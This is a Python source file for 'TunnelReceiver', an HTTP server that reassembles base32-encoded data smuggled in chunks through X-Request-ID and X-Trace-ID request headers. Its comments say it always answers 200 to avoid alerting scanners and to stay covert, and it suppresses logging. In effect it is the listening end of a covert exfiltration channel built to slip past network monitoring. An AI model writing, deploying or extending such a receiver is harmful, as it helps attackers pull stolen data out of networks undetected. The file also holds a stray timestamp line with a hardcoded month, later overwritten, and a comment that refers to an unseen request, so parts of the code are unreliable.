import base64
import json
import threading
import uuid
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict

class TunnelHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Silence standard HTTP logging to keep console clean
        pass

    def do_GET(self):
        self.process_request()

    def do_POST(self):
        self.process_request()

    def process_request(self):
        request_id = self.headers.get('X-Request-ID')
        trace_id = self.headers.get('X-Trace-ID')

        if not request_id or not trace_id:
            self.send_response(200) # Still return 200 to avoid alerting scanners
            self.end_headers()
            return

        try:
            # Format: session_id:chunk_index:total_chunks
            parts = request_id.split(':')
            if len(parts) != 3:
                # Log or handle malformed request
                self.send_response(200)
                self.end_headers()
                return
                
            session_id, chunk_index_str, total_chunks_str = parts
            chunk_index = int(chunk_index_str)
            total_chunks = int(total_chunks_str)
            
            self.server.receiver.add_chunk(session_id, chunk_index, total_chunks, trace_id, self.client_address[0])
            
            self.send_response(200)
            self.end_headers()
        except Exception as e:
            print(f"Error processing tunnel request: {e}")
            self.send_response(200) # Stay covert even on error
            self.end_headers()

class TunnelReceiver:
    def __init__(self, host='0.0.0.0', port=9000):
        self.host = host
        self.port = port
        self.server = None
        self.thread = None
        self.messages = []
        self.sessions = defaultdict(dict)
        self._running = False

    def start(self):
        if self._running:
            return
        
        self.server = HTTPServer((self.host, self.port), TunnelHandler)
        self.server.receiver = self
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self._running = True

    def stop(self):
        if not self._running:
            return
        
        self.server.shutdown()
        self.server.server_close()
        self._running = False

    @property
    def is_running(self):
        return self._running

    def add_chunk(self, session_id, index, total, data, sender_ip):
        start_time = datetime.now()
        session = self.sessions[session_id]
        session[index] = data
        
        if len(session) == total:
            # Reconstruct and decode
            try:
                chunks_ordered = [session[i] for i in sorted(session.keys())]
                b32 = "".join(chunks_ordered)
                pad = (8 - len(b32) % 8) % 8
                b32 += "=" * pad
                payload = base64.b32decode(b32.upper()).decode('utf-8')
                
                decode_time = (datetime.now() - start_time).total_seconds() * 1000
                
                message = {
                    "id": str(uuid.uuid4())[:8],
                    "timestamp": datetime.now().strftime("%Y-03-16 %H:%M:%S"), # Using fixed date as per request example or current
                    "session_id": session_id,
                    "protocol": "HTTP",
                    "sender_ip": sender_ip,
                    "payload": payload,
                    "chunks_received": total,
                    "decode_time_ms": round(decode_time, 2)
                }
                
                # Correcting timestamp to use current time but matching format
                message["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                self.messages.insert(0, message) # Newest at the top
                del self.sessions[session_id]
            except Exception as e:
                print(f"Error decoding message: {e}")
                if session_id in self.sessions:
                    del self.sessions[session_id]

    def get_messages(self):
        return self.messages

    def clear_messages(self):
        cleared_count = len(self.messages)
        self.messages = []
        return cleared_count
